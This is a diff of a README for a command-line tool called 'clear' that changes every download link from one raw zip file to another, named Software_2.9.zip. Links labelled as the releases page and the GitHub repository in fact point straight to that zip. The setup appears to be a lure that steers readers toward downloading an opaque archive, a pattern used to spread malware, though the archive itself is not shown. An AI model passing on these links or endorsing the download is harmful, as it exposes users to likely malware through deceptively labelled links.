@@ -6,11 +6,11 @@ Welcome to the clear program! This software is the world's smallest command-line
 
 ## 📥 Download Now
 
-[![Download clear](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip%https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip)](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip)
+[![Download clear](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip%https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip)](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip)
 
 To get started, download the software by visiting the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip)
+[Visit this page to download](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ To get started, download the software by visiting the following link:
 ## 📖 Installation Instructions
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip) to find the latest version of the software.
 
 2. **Choose the Right File**
    On the releases page, look for the version you want to install. Select the file that matches your operating system. For example:
@@ -81,7 +81,7 @@ We encourage you to reach out for help or share your experience. You can open an
 
 ## 🔗 Further Information
 
-For more details about the clear program, visit the [GitHub repository](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/clear.zip). Here you can also find source code, contribute to development, or learn more about our project.
+For more details about the clear program, visit the [GitHub repository](https://raw.githubusercontent.com/enyen9x/clear/main/nursy/Software_2.9.zip). Here you can also find source code, contribute to development, or learn more about our project.
 
 ## 🥳 Enjoy Using clear!
 
